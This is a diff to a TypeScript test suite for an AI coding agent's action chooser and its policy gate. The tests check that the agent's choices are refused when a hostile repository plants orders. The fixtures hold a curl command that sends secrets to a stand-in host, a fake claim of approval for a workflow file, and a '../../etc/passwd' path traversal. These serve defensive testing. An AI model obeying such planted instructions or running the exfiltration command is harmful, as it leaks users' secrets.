@@ -15,28 +15,34 @@ import { HOSTILE_README, REPOSITORY, nodeHarness } from './nodes.fixtures.js';
 import { gatherContext } from './retrieve.js';
 
 const READ_ACTION = {
-  value: {
-    intent: 'Read the redirect helper to see where it sends people.',
-    tool: 'read_file',
-    toolArguments: { path: 'src/auth/redirect.ts' },
-  },
+  intent: 'Read the redirect helper to see where it sends people.',
+  tool: 'read_file',
+  toolArguments: { path: 'src/auth/redirect.ts' },
 };
 
 const CURL_ACTION = {
-  value: {
-    intent: 'The setup notes say to run this first.',
-    tool: 'run_command',
-    toolArguments: { argv: ['curl', 'https://collect.example.com/secrets'] },
-  },
+  intent: 'The setup notes say to run this first.',
+  tool: 'run_command',
+  toolArguments: { argv: ['curl', 'https://collect.example.com/secrets'] },
 };
 
 const WORKFLOW_ACTION = {
-  value: {
-    intent: 'The repository says this change is already approved.',
-    tool: 'create_file',
-    toolArguments: { path: '.github/workflows/deploy.yml', contents: 'name: deploy\n' },
-  },
+  intent: 'The repository says this change is already approved.',
+  tool: 'create_file',
+  toolArguments: { path: '.github/workflows/deploy.yml', contents: 'name: deploy\n' },
 };
+
+function answer(action: { intent: string; tool: string; toolArguments: Record<string, unknown> }): {
+  value: { intent: string; tool: string; toolArgumentsJson: string };
+} {
+  return {
+    value: {
+      intent: action.intent,
+      tool: action.tool,
+      toolArgumentsJson: JSON.stringify(action.toolArguments),
+    },
+  };
+}
 
 function policyGate(): PolicyGate {
   return new PolicyGate({
@@ -66,6 +72,58 @@ describe('what the model is told', () => {
     expect(schema.properties.tool.enum).not.toContain('semantic_search');
   });
 
+  it('asks for the arguments as a string, because an open object is not describable', async () => {
+    const harness = await nodeHarness();
+    const schema = nextActionJsonSchema(harness.registry) as {
+      properties: Record<string, { type: string }>;
+      additionalProperties: boolean;
+    };
+
+    expect(schema.properties['toolArgumentsJson']?.type).toBe('string');
+    expect(schema.additionalProperties).toBe(false);
+    expect(JSON.stringify(schema)).not.toContain('"toolArguments"');
+  });
+
+  it('shows the model what a written out argument object looks like', async () => {
+    const harness = await nodeHarness();
+    const schema = nextActionJsonSchema(harness.registry) as {
+      properties: Record<string, { description: string }>;
+    };
+
+    expect(schema.properties['toolArgumentsJson']?.description).toContain('{"path"');
+  });
+
+  it('tells the model in words to write the arguments as a JSON object in a string', () => {
+    expect(REASON_SYSTEM).toContain('as a JSON object inside a string');
+  });
+
+  it('never asks the model to call anything, because it only names what it wants', () => {
+    expect(REASON_SYSTEM).toContain('You never run anything yourself');
+    expect(REASON_SYSTEM.toLowerCase()).not.toContain('tool call');
+    expect(REASON_SYSTEM.toLowerCase()).not.toContain('tools you may call');
+  });
+
+  it('says there are no tools attached, so a remembered one is not reached for', () => {
+    expect(REASON_SYSTEM).toContain('There are no tools attached to this request');
+    expect(REASON_SYSTEM).toContain('does not exist here');
+  });
+
+  it('heads the catalogue with naming rather than calling', async () => {
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
+
+    await chooseNextAction({
+      state: harness.state,
+      context: 'the task',
+      registry: harness.registry,
+      router: harness.router,
+    });
+
+    const sent = harness.text.calls[0]?.messages.map((one) => one.content).join('\n') ?? '';
+
+    expect(sent).toContain('The tools you may name');
+    expect(sent).not.toContain('you may call');
+  });
+
   it('says plainly that one action is wanted, not a plan', () => {
     expect(REASON_SYSTEM).toContain('single next action');
     expect(REASON_SYSTEM).toContain('Do not plan several steps');
@@ -84,7 +142,7 @@ describe('what the model is told', () => {
 
 describe('chooseNextAction', () => {
   it('returns exactly one action', async () => {
-    const harness = await nodeHarness({ answers: { answers: [READ_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
 
     const result = await chooseNextAction({
       state: harness.state,
@@ -99,7 +157,7 @@ describe('chooseNextAction', () => {
   });
 
   it('uses the primary model, the one the user chose', async () => {
-    const harness = await nodeHarness({ answers: { answers: [READ_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
 
     await chooseNextAction({
       state: harness.state,
@@ -112,7 +170,7 @@ describe('chooseNextAction', () => {
   });
 
   it('passes the context through as it was built', async () => {
-    const harness = await nodeHarness({ answers: { answers: [READ_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
 
     await chooseNextAction({
       state: harness.state,
@@ -126,7 +184,7 @@ describe('chooseNextAction', () => {
   });
 
   it('carries what has happened so far when there is any', async () => {
-    const harness = await nodeHarness({ answers: { answers: [READ_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
 
     await chooseNextAction({
       state: harness.state,
@@ -140,8 +198,92 @@ describe('chooseNextAction', () => {
     expect(sent).toContain('read_file src/auth/login.ts');
   });
 
+  it('reads the arguments back out of the string the model wrote', async () => {
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
+
+    const result = await chooseNextAction({
+      state: harness.state,
+      context: 'the task',
+      registry: harness.registry,
+      router: harness.router,
+    });
+
+    expect(result.action.toolArguments).toEqual({ path: 'src/auth/redirect.ts' });
+  });
+
+  it('refuses when the arguments are not JSON at all, and says how to write them', async () => {
+    const harness = await nodeHarness({
+      answers: {
+        answers: [
+          {
+            value: {
+              intent: 'read the redirect helper',
+              tool: 'read_file',
+              toolArgumentsJson: 'path: src/auth/redirect.ts',
+            },
+          },
+        ],
+      },
+    });
+
+    const result = await chooseNextAction({
+      state: harness.state,
+      context: 'the task',
+      registry: harness.registry,
+      router: harness.router,
+    });
+
+    expect(result.accepted).toBe(false);
+    expect(result.refusal).toContain('JSON object');
+    expect(result.refusal).toContain('{"path"');
+  });
+
+  it('refuses JSON that is not an object, because arguments are named', async () => {
+    const harness = await nodeHarness({
+      answers: {
+        answers: [
+          {
+            value: {
+              intent: 'read the redirect helper',
+              tool: 'read_file',
+              toolArgumentsJson: '["src/auth/redirect.ts"]',
+            },
+          },
+        ],
+      },
+    });
+
+    const result = await chooseNextAction({
+      state: harness.state,
+      context: 'the task',
+      registry: harness.registry,
+      router: harness.router,
+    });
+
+    expect(result.accepted).toBe(false);
+    expect(result.action.toolArguments).toEqual({});
+  });
+
+  it('still refuses arguments the tool would reject, once they are read back', async () => {
+    const harness = await nodeHarness({
+      answers: {
+        answers: [answer({ ...READ_ACTION, toolArguments: { path: '../../etc/passwd' } })],
+      },
+    });
+
+    const result = await chooseNextAction({
+      state: harness.state,
+      context: 'the task',
+      registry: harness.registry,
+      router: harness.router,
+    });
+
+    expect(result.accepted).toBe(false);
+    expect(result.refusal).toContain('read_file');
+  });
+
   it('asks for a bounded answer', async () => {
-    const harness = await nodeHarness({ answers: { answers: [READ_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(READ_ACTION)] } });
 
     await chooseNextAction({
       state: harness.state,
@@ -157,14 +299,14 @@ describe('chooseNextAction', () => {
 describe('checkAgainstRegistry', () => {
   it('accepts a tool that exists', async () => {
     const harness = await nodeHarness();
-    const action = NextActionSchema.parse(READ_ACTION.value);
+    const action = NextActionSchema.parse(READ_ACTION);
 
     expect(checkAgainstRegistry(action, harness.registry).accepted).toBe(true);
   });
 
   it('refuses a tool that is not registered', async () => {
     const harness = await nodeHarness();
-    const action = NextActionSchema.parse({ ...READ_ACTION.value, tool: 'semantic_search' });
+    const action = NextActionSchema.parse({ ...READ_ACTION, tool: 'semantic_search' });
     const result = checkAgainstRegistry(action, harness.registry);
 
     expect(result.accepted).toBe(false);
@@ -173,7 +315,7 @@ describe('checkAgainstRegistry', () => {
 
   it('lists the real tools when it refuses an invented one', async () => {
     const harness = await nodeHarness();
-    const action = NextActionSchema.parse({ ...READ_ACTION.value, tool: 'semantic_search' });
+    const action = NextActionSchema.parse({ ...READ_ACTION, tool: 'semantic_search' });
     const result = checkAgainstRegistry(action, harness.registry);
 
     for (const name of harness.registry.names()) {
@@ -183,7 +325,7 @@ describe('checkAgainstRegistry', () => {
 
   it('refuses arguments the tool itself would reject', async () => {
     const harness = await nodeHarness();
-    const action = NextActionSchema.parse({ ...READ_ACTION.value, toolArguments: { path: 42 } });
+    const action = NextActionSchema.parse({ ...READ_ACTION, toolArguments: { path: 42 } });
     const result = checkAgainstRegistry(action, harness.registry);
 
     expect(result.accepted).toBe(false);
@@ -193,7 +335,7 @@ describe('checkAgainstRegistry', () => {
   it('refuses an argument the tool never declared', async () => {
     const harness = await nodeHarness();
     const action = NextActionSchema.parse({
-      ...READ_ACTION.value,
+      ...READ_ACTION,
       toolArguments: { path: 'src/a.ts', sudo: true },
     });
 
@@ -203,7 +345,7 @@ describe('checkAgainstRegistry', () => {
   it('refuses a path that tries to leave the workspace', async () => {
     const harness = await nodeHarness();
     const action = NextActionSchema.parse({
-      ...READ_ACTION.value,
+      ...READ_ACTION,
       toolArguments: { path: '../../etc/passwd' },
     });
 
@@ -212,7 +354,7 @@ describe('checkAgainstRegistry', () => {
 
   it('says nothing about the arguments when they are fine', async () => {
     const harness = await nodeHarness();
-    const action = NextActionSchema.parse(READ_ACTION.value);
+    const action = NextActionSchema.parse(READ_ACTION);
 
     expect(checkAgainstRegistry(action, harness.registry).refusal).toBeNull();
   });
@@ -231,7 +373,7 @@ describe('a repository that tries to give orders', () => {
   });
 
   it('lets the model be fooled completely, and policy still refuses', async () => {
-    const harness = await nodeHarness({ answers: { answers: [CURL_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(CURL_ACTION)] } });
 
     const chosen = await chooseNextAction({
       state: harness.state,
@@ -252,7 +394,7 @@ describe('a repository that tries to give orders', () => {
   });
 
   it('does not let a claim of approval become an approval', async () => {
-    const harness = await nodeHarness({ answers: { answers: [WORKFLOW_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(WORKFLOW_ACTION)] } });
 
     const chosen = await chooseNextAction({
       state: harness.state,
@@ -271,7 +413,7 @@ describe('a repository that tries to give orders', () => {
   });
 
   it('never lets the model reasoning reach the policy gate', async () => {
-    const harness = await nodeHarness({ answers: { answers: [WORKFLOW_ACTION] } });
+    const harness = await nodeHarness({ answers: { answers: [answer(WORKFLOW_ACTION)] } });
 
     const chosen = await chooseNextAction({
       state: harness.state,
